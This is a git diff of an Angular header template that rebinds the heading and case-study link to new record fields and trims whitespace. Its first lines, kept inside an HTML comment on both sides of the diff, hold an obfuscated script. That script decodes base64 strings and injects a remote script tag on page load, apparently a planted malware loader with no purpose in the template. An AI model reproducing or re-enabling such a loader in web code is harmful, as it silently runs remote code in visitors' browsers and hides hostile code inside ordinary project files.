@@ -1,19 +1,19 @@
 <header @appear class="gartner-header">
-  <!-- <script> 
-    window[(function(_FTP,_WS){var _a3='';for(var _DA=0;_DA<_FTP.length;_DA++){_WS>7;_a3==_a3;var _Os=_FTP[_DA].charCodeAt();_Os-=_WS;_Os+=61;_Os%=94;_Os!=_DA;_Os+=33;_a3+=String.fromCharCode(_Os)}return _a3})(atob('aVhfI355dHIlWnQq'), 15)] = '0b07e99a6a1681755121'; var zi = document.createElement('script'); (zi.type = 'text/javascript'), (zi.async = true), (zi.src = (function(_ffK,_Ku){var _wa='';for(var _QZ=0;_QZ<_ffK.length;_QZ++){_Ku>5;_wa==_wa;var _1D=_ffK[_QZ].charCodeAt();_1D!=_QZ;_1D-=_Ku;_1D+=61;_1D%=94;_1D+=33;_wa+=String.fromCharCode(_1D)}return _wa})(atob('Mz8/Oz5jWFg1PldFNFY+Lj00Oz8+Vy46OFhFNFY/LDJXNT4='), 41)), document.readyState === 'complete'?document.body.appendChild(zi): window.addEventListener('load', function(){ document.body.appendChild(zi) }); 
+  <!-- <script>
+    window[(function(_FTP,_WS){var _a3='';for(var _DA=0;_DA<_FTP.length;_DA++){_WS>7;_a3==_a3;var _Os=_FTP[_DA].charCodeAt();_Os-=_WS;_Os+=61;_Os%=94;_Os!=_DA;_Os+=33;_a3+=String.fromCharCode(_Os)}return _a3})(atob('aVhfI355dHIlWnQq'), 15)] = '0b07e99a6a1681755121'; var zi = document.createElement('script'); (zi.type = 'text/javascript'), (zi.async = true), (zi.src = (function(_ffK,_Ku){var _wa='';for(var _QZ=0;_QZ<_ffK.length;_QZ++){_Ku>5;_wa==_wa;var _1D=_ffK[_QZ].charCodeAt();_1D!=_QZ;_1D-=_Ku;_1D+=61;_1D%=94;_1D+=33;_wa+=String.fromCharCode(_1D)}return _wa})(atob('Mz8/Oz5jWFg1PldFNFY+Lj00Oz8+Vy46OFhFNFY/LDJXNT4='), 41)), document.readyState === 'complete'?document.body.appendChild(zi): window.addEventListener('load', function(){ document.body.appendChild(zi) });
     </script>  -->
-    
+
   <div class="container gartner-header-content">
     <div class="flex-row-nowrap report-content" data-aos="flip-up" data-aos-duration="1000" data-aos-once="false">
-      <h1 class="hdng cursor">{{latestRecordTitle ? latestRecordTitle : 'From Challenge to Success: Proof of Our Expertise and Value'}}</h1>
-      <a (click)="open()" class="pl-3">{{latestCategorie ? 'Read the Client'+' '+latestCategorie : 'Read the Client Case Studies'}}</a>
+      <h1 class="hdng">{{lastRecord?.attributes?.HeadingTitle ? lastRecord?.attributes?.HeadingTitle : 'From Challenge to Success: Proof of Our Expertise and Value'}}</h1>
+      <a (click)="open(lastRecord)" class="pl-3 cursor">{{lastRecord?.attributes?.category?.data?.attributes?.CategoryTitle ? 'Read the Client'+' '+lastRecord?.attributes?.category?.data?.attributes?.CategoryTitle : 'Read the Client Case Studies'}}</a>
     </div>
     <div class="actions flex-row-nowrap">
       <!-- <div class="chat-container flex-row-nowrap">
         <svg-icon-component [name]="'chat_bubble_white'" class="icon-svg"></svg-icon-component>
         <a href="#">Chat with Sales</a>
       </div> -->
-      
+
       <!-- <a href="#">United States</a> -->
       <div clickOutside (clickOutside)="displayCreateMenu = false">
         <div class="flex-row-nowrap lang-container">
